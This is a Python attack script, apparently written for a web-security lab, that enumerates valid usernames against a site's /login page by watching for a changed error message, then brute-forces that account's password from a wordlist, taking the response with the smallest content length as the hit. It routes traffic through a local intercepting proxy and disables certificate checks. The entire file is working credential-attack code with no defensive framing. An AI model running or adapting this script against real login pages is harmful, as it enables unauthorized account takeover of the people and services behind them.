import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : "http://127.0.0.1:8080", 'https' : 'http://127.0.0.1:8080' }

def load_word_list(filepath):
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print('(+) Error : File %s does not exist' % filepath)

def username_enumeration_attack(s, url, usernames):
    login_url = url + '/login'

    for user in usernames:
        login_data = { 'username' : user, 'password' : 'test'}

        for i in range(5):
            r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
            res = r.text
            if "Invalid username or password." not in res:
                return user

def password_bruteforce_attack(s, url, username, passwords):
    login_url = url + '/login'


    least_content_length = float('inf')
    correct_password = None

    for password in passwords:
        login_data = { 'username' : username, 'password' : password }

        r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
        current_content_length = len(r.content)
        if current_content_length < least_content_length:
            least_content_length=current_content_length
            correct_password = password

    return correct_password

def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    usernames = load_word_list('usernames.txt')
    passwords = load_word_list('passwords.txt')

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    username = username_enumeration_attack(s, url, usernames)
    password = password = password_bruteforce_attack(s, url, username, passwords)
    print('User creds : Username : %s, password : %s'% (username, password))

if __name__ == "__main__":
    main()